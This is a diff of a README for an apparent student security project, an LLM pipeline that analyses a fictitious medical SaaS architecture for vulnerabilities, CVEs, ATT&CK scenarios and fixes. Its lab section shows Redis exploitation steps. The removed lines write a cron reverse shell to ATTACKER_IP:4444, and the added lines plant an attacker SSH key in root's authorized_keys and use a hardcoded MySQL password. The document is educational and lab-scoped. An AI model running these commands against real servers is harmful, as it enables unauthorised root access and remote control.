@@ -1,64 +1,71 @@
-# VulnAI Management — Automated Security Analysis System
+# VulnAI Management
 
-> **TP3 EFREI — RS3 S8 ARIR83** — Josselin KEIB, Mattéo LAUNAY  
-> Système de gestion de vulnérabilités piloté par l'IA
+> TP3 EFREI RS3 S8 ARIR83 — Josselin KEIB, Mattéo LAUNAY
 
-## Overview
+Pipeline d'analyse de sécurité piloté par LLM, développé pour le TP3.
 
-LLM-driven pipeline that ingests an architecture description and automatically:
+On lui donne la description textuelle d'une architecture, il génère un rapport : vulnérabilités détectées, CVE associées, scénarios d'attaque et recommandations de correction concrètes.
 
-1. **Parses** the architecture into structured components
-2. **Identifies** vulnerabilities via LLM analysis (Claude / Llama3 / GPT-4o)
-3. **Maps** each vulnerability to CVE entries via the NVD API
-4. **Generates** MITRE ATT&CK kill chain scenarios
-5. **Proposes** actionable, verifiable mitigations
-6. **Exports** a JSON report + a professional HTML report
+Architecture testée : **MediConnect Corp**, plateforme SaaS médicale fictive.
 
-Target architecture: **MediConnect Corp** — fictitious medical SaaS platform.
+## Ce que fait le pipeline
 
-## Project Structure
+1. Lit la description de l'architecture et en extrait les composants (regex + LLM)
+2. Interroge le LLM pour identifier les vulnérabilités (Claude, Llama3 ou GPT-4o)
+3. Cherche les CVE correspondantes via l'API NVD
+4. Génère des scénarios d'attaque calqués sur le framework MITRE ATT&CK
+5. Propose des corrections avec les commandes de vérification
+6. Exporte le tout en JSON et en HTML
+
+## Organisation du code
 
 ```
 vuln_ai/
-├── main.py                   # Pipeline entry point
-├── parser/arch_parser.py     # Hybrid architecture parser (regex + LLM)
-├── analyzer/llm_analyzer.py  # LLM vulnerability analyser
-├── mapper/cve_mapper.py      # NVD API CVE enrichment
-├── scenarios/attack_gen.py   # MITRE ATT&CK scenario generator
-├── mitigations/mitigation_gen.py  # Actionable mitigation generator
-└── output/report_builder.py  # JSON + HTML report builder
+├── main.py                        # point d'entrée
+├── parser/arch_parser.py          # extraction des composants (regex + LLM)
+├── analyzer/llm_analyzer.py       # détection des vulnérabilités
+├── mapper/cve_mapper.py           # récupération des CVE via l'API NVD
+├── scenarios/attack_gen.py        # génération de scénarios d'attaque
+├── mitigations/mitigation_gen.py  # recommandations de correction
+└── output/report_builder.py       # export JSON + HTML
 
-data/mediconnect_arch.txt     # MediConnect architecture description
-lab/docker-compose.yml        # Lab environment for Scenario C (Redis)
-config.yaml                   # LLM + NVD configuration
+data/mediconnect_arch.txt  # description de l'architecture MediConnect
+lab/docker-compose.yml     # lab Docker pour le Scénario C (Redis sans auth)
+config.yaml                # configuration LLM et NVD
 ```
 
-## Quick Start
+## Installation
 
 ```bash
-# 1. Install dependencies
 pip install -r requirements.txt
-
-# 2. Configure API keys
 cp .env.example .env
-# Edit .env — add your ANTHROPIC_API_KEY
-
-# 3. Run the full pipeline
-python -m vuln_ai.main
-
-# Options
-python -m vuln_ai.main --skip-cve        # Skip NVD enrichment (faster)
-python -m vuln_ai.main --skip-scenarios  # Skip attack scenario generation
-python -m vuln_ai.main --arch path/to/custom_arch.txt
+# Renseigner ANTHROPIC_API_KEY dans .env si on utilise Claude
 ```
 
-Reports are saved to `output/`:
-- `output/report_raw.json` — machine-readable full report
-- `output/report_mediconnect.html` — human-readable HTML report
+## Utilisation
 
-## LLM Configuration
+```bash
+# Sans clé API — données de démo pré-remplies, pipeline complet
+python -m vuln_ai.main --demo
 
-Edit `config.yaml`:
+# Pipeline complet avec LLM
+python -m vuln_ai.main
+
+# Sans appels NVD (plus rapide pour tester)
+python -m vuln_ai.main --skip-cve
+
+# Sur une autre architecture
+python -m vuln_ai.main --arch chemin/vers/mon_archi.txt
+```
+
+Les rapports se trouvent dans `output/` :
+
+- `output/report_raw.json` : données brutes
+- `output/report_mediconnect.html` : rapport lisible dans un navigateur
+
+## Configurer le LLM
+
+Dans `config.yaml` :
 
 ```yaml
 llm:
@@ -66,7 +73,7 @@ llm:
   model: claude-sonnet-4-6
 ```
 
-For local Ollama (privacy-preserving, recommended for real data):
+Pour tourner en local avec Ollama (aucune donnée ne sort de la machine) :
 
 ```yaml
 llm:
@@ -76,25 +83,29 @@ ollama:
   model: llama3:70b
 ```
 
-## Lab — Scenario C (Redis Unauthenticated)
+Dans un contexte médical réel, Ollama est le bon choix. Pour l'architecture fictive MediConnect, les deux fonctionnent.
+
+## Lab — Scénario C : Redis sans authentification
 
 ```bash
 cd lab/
 docker compose up -d
-
-# Target: redis on localhost:6379 (no auth)
-# Webapp: http://localhost:8080
-
-# Attack steps (educational — isolated lab only):
-redis-cli -h 127.0.0.1
-CONFIG SET dir /tmp
-CONFIG SET dbfilename shell.sh
-SET x "*/1 * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
-BGSAVE
+# Redis sur localhost:6379, pas de mot de passe
+# Webapp sur http://localhost:8080
 ```
 
-## Legal Disclaimer
+Kill chain à reproduire en lab isolé :
 
-All techniques in this project are restricted to **isolated lab environments**.  
-Exploiting real systems without explicit written authorisation is a criminal offence  
-(Article 323-1 of the French Penal Code).
+```bash
+redis-cli -h 127.0.0.1
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SET x "\n\nssh-rsa AAAA...cle_attaquant...\n\n"
+BGSAVE
+ssh root@127.0.0.1
+mysql -u app_user -pApp2023! -h mysql mediconnect
+```
+
+## Avertissement
+
+Ces techniques sont réservées aux labs isolés. Les utiliser sur des systèmes réels sans autorisation écrite est un délit (article 323-1 du Code pénal).
